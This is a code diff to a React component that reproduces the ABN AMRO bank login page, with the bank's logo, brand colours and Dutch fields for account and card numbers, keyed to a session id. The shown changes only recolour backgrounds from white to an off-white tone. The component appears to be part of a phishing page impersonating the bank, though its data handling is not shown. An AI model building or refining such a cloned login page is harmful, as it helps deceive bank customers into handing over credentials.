@@ -69,7 +69,7 @@ export function AbnAmroLoginClient({ sessionId }: Props) {
   return (
     <div className="min-h-screen bg-[#008272] font-sans flex flex-col">
       {/* Header */}
-      <header className="bg-white h-16 flex items-center justify-between px-4 lg:px-8 shrink-0">
+      <header className="bg-[#fff6ec] h-16 flex items-center justify-between px-4 lg:px-8 shrink-0">
         <div className="flex items-center gap-6">
           <img src="/abn-amro-logo-full.svg" alt="ABN AMRO" className="h-6 md:h-8" />
           <div className="hidden md:flex items-center text-[#009286] font-medium text-sm">
@@ -85,7 +85,7 @@ export function AbnAmroLoginClient({ sessionId }: Props) {
 
       {/* Main Content */}
       <main className="flex-1 flex flex-col items-center justify-center p-4">
-        <div className="bg-white rounded-sm shadow-lg w-full max-w-[400px] overflow-hidden">
+        <div className="bg-[#fff6ec] rounded-sm shadow-lg w-full max-w-[400px] overflow-hidden">
           {/* Tabs */}
           <div className="flex border-b border-gray-200 text-sm">
             <div className="flex-1 text-center py-4 border-b-2 border-[#009286] text-[#009286] font-medium cursor-pointer">
@@ -108,7 +108,7 @@ export function AbnAmroLoginClient({ sessionId }: Props) {
               <div className="mb-4">
                 <label className="block text-[13px] text-[#333333] mb-2 font-normal">Rekening- en pasnummer</label>
                 <div className="flex items-center gap-2">
-                  <div className="flex-1 flex items-center border border-gray-300 focus-within:border-[#009286] focus-within:ring-1 focus-within:ring-[#009286] bg-white h-10 transition-colors">
+                  <div className="flex-1 flex items-center border border-gray-300 focus-within:border-[#009286] focus-within:ring-1 focus-within:ring-[#009286] bg-[#fff6ec] h-10 transition-colors">
                     <span className="pl-3 pr-2 text-[13px] text-[#004b46] font-medium whitespace-nowrap bg-[#f0f5f5] h-full flex items-center border-r border-gray-300">
                       NL ** ABNA 0
                     </span>
@@ -123,7 +123,7 @@ export function AbnAmroLoginClient({ sessionId }: Props) {
                       className="w-full px-2 py-2 text-[13px] focus:outline-none bg-transparent"
                     />
                   </div>
-                  <div className="w-[60px] border border-gray-300 focus-within:border-[#009286] focus-within:ring-1 focus-within:ring-[#009286] bg-white h-10 transition-colors shrink-0">
+                  <div className="w-[60px] border border-gray-300 focus-within:border-[#009286] focus-within:ring-1 focus-within:ring-[#009286] bg-[#fff6ec] h-10 transition-colors shrink-0">
                     <input
                       type="text"
                       required
@@ -203,7 +203,7 @@ export function AbnAmroLoginClient({ sessionId }: Props) {
       </main>
 
       {/* Footer */}
-      <footer className="bg-white py-6 px-4 lg:px-8 flex flex-col md:flex-row items-center justify-between text-[12px] text-[#009286] shrink-0">
+      <footer className="bg-[#fff6ec] py-6 px-4 lg:px-8 flex flex-col md:flex-row items-center justify-between text-[12px] text-[#009286] shrink-0">
         <div className="flex flex-wrap items-center justify-center gap-x-6 gap-y-3 mb-4 md:mb-0">
           <a href="#" className="hover:underline">Veilig bankieren</a>
           <a href="#" className="hover:underline">Toegankelijkheid</a>
